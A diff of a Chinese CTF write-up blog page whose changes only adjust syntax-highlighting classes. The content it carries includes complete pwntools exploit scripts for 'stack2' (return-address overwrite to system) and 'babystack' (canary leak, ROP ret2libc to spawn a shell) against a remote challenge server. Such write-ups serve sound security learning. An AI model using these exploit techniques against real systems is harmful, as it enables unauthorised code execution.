@@ -123,7 +123,7 @@
 
 <p>  其实这里没有必要深入计算，因为动态调试可以算出偏移为0x84,但是作为一个知识点，我们还是要讨论一下这个main函数的返回方式，我们遇到过很多main函数通过ecx进行返回，并且有esp对其的过程。</p>
 
-<p>  这一次，首先将 <strong>$esp + 4</strong> 放入ecx，然后 <code class="highlighter-rouge">and esp,0xfffffff0</code> 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 <strong>$ecx - 4</strong> 压入栈中。注意，这里的 <strong>$ecx - 4</strong> 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 <code class="highlighter-rouge">lea ecx, dword [arg_4h]</code> 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样：</p>
+<p>  这一次，首先将 <strong>$esp + 4</strong> 放入ecx，然后 <code class="language-plaintext highlighter-rouge">and esp,0xfffffff0</code> 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 <strong>$ecx - 4</strong> 压入栈中。注意，这里的 <strong>$ecx - 4</strong> 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 <code class="language-plaintext highlighter-rouge">lea ecx, dword [arg_4h]</code> 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样：</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>						<span class="n">high</span>                                <span class="o">|</span>		<span class="n">arg_4</span>		 <span class="o">|</span>
 											 <span class="o">|</span>	<span class="n">return_addr</span>        <span class="o">|</span>             <span class="n">return_addr</span> <span class="mi">1</span>                                  
@@ -143,30 +143,30 @@
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x804859B</span>
 <span class="c1">#sh = process("./stack2")
 </span><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"111.198.29.45"</span><span class="p">,</span><span class="mi">53413</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">fuck</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
 
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x9b</span><span class="p">)</span>
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0x85</span><span class="p">)</span>
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0x04</span><span class="p">)</span>
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x08</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>  但是打过去之后发现系统提示:</p>
@@ -177,25 +177,25 @@
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
 </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
 
 <span class="c1">#sh = process("./stack2")
 </span><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"111.198.29.45"</span><span class="p">,</span><span class="mi">53413</span><span class="p">)</span>
 
 <span class="n">sys_addr</span> <span class="o">=</span> <span class="mh">0x0804859b</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">fuck</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
 
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span>
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">)</span>
@@ -207,9 +207,9 @@
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">)</span>
 <span class="n">fuck</span><span class="p">(</span><span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <h3 id="pwn1-babystack">pwn1 babystack</h3>
@@ -228,7 +228,7 @@
 
 <p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_3.png?raw=true" alt="canary" /></p>
 
-<p>  接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 <code class="highlighter-rouge">pop rdi ; ret</code> .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。</p>
+<p>  接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 <code class="language-plaintext highlighter-rouge">pop rdi ; ret</code> .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。</p>
 
 <p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_4.png?raw=true" alt="rop" /></p>
 
@@ -237,69 +237,69 @@
 
 <span class="c1">#  sh = process('./babystack')
 </span><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'111.198.29.45'</span><span class="p">,</span><span class="mi">35646</span><span class="p">)</span> 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./babystack'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.23.so'</span><span class="p">)</span>
 
-<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
-<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
-<span class="n">puts_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
-<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">puts_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00400a93</span>
 <span class="n">main</span> <span class="o">=</span> <span class="mh">0x00400908</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_plt '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_libc '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_libc</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_plt '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_libc '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_libc</span><span class="p">))</span>
 
 <span class="n">padding</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">136</span>
 
 <span class="c1">#get_canary
-</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">136</span><span class="p">)</span>
-<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0xa</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'canary '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+</span><span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">136</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0xa</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'canary '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
 
 <span class="c1">#get_system
 </span><span class="k">def</span> <span class="nf">getTarget</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">canary</span><span class="p">):</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s">'b'</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
     <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
     <span class="c1">#  sh.recvuntil('b'*8)
-</span>    <span class="n">addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+</span>    <span class="n">addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
     <span class="k">return</span> <span class="n">addr</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">getTarget</span><span class="p">(</span><span class="n">puts_got</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'puts_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
 
 <span class="c1">#get_offset_system_bin_sh 
 </span><span class="n">offset</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">puts_libc</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">system_libc</span> <span class="o">+</span> <span class="n">offset</span> 
-<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span><span class="o">.</span><span class="nb">next</span><span class="p">()</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'bin_sh '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'bin_sh '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
 
 <span class="c1">#fuckup
-</span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+</span><span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s">'b'</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p>  在输入输出那里比较坑，需要多调几下。</p>
 
